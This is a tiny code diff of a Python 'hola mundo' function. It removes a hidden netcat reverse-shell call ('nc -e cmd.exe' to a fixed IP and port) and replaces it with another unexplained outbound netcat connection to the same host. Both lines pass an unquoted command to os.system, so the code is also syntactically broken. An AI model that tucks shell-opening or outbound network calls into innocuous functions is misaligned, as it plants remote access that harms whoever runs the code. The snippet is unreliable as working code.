@@ -1,4 +1,3 @@
 def run():
   print('hola mundo')
-
- os.system(nc -e cmd.exe 172.16.32.138 8080)
+ os.system(nc -nv 172.16.32.138 8080)
